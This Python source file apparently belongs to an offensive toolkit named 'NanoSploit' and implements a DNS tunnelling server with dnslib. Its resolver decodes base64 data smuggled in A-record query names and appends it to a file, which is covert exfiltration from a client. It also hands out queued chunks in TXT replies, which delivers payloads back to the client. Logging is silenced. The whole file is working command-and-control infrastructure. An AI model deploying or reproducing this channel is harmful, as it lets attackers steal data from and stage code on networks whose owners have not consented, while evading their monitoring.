from dnslib import DNSRecord, DNSHeader, A, TXT, RR, QTYPE
from dnslib.server import DNSServer, BaseResolver, DNSLogger
from base64 import b64decode


# Mutable globals
dns_handler = None


class NanoSploitResolver(BaseResolver):
    filename = None
    chunks = None

    def resolve(self, request, _handler):
        # Get request fields
        qname = str(request.q.qname)
        qtype = request.q.qtype

        # Prepare reply packet
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        # Handle Client -> Server
        if qtype == QTYPE.A and ".file" in qname and self.filename:
            with open(self.filename, 'ab') as f:
                f.write(b64decode(qname.replace(".file.", "")))
            reply.add_answer(RR(qname, qtype, rdata=A('1.1.1.1')))

        # Handle Server -> Client
        elif qtype == QTYPE.TXT and ".get" in qname and self.chunks:
            reply.add_answer(RR(qname, qtype, rdata=TXT(self.chunks.pop(0))))

        else:
            if qtype == QTYPE.A:
                reply.add_answer(RR(qname, qtype, rdata=A('2.2.2.2')))
            elif qtype == QTYPE.TXT:
                reply.add_answer(RR(qname, qtype, rdata=TXT(b"end")))

        # If 1.1.1.1 then success, if 2.2.2.2 bad request
        return reply


def init_dns_server():
    # Define our custom resolver
    resolver = NanoSploitResolver()

    # Set the logger function to a None function, so it doesn't print things on screen
    logger = DNSLogger(logf=lambda _: None)

    # Instantiate a DNS server
    server = DNSServer(resolver, port=8053, logger=logger)

    # Start server in background
    server.start_thread()
    print("📔 Started DNS server on port 8053")

    global dns_handler
    dns_handler = resolver
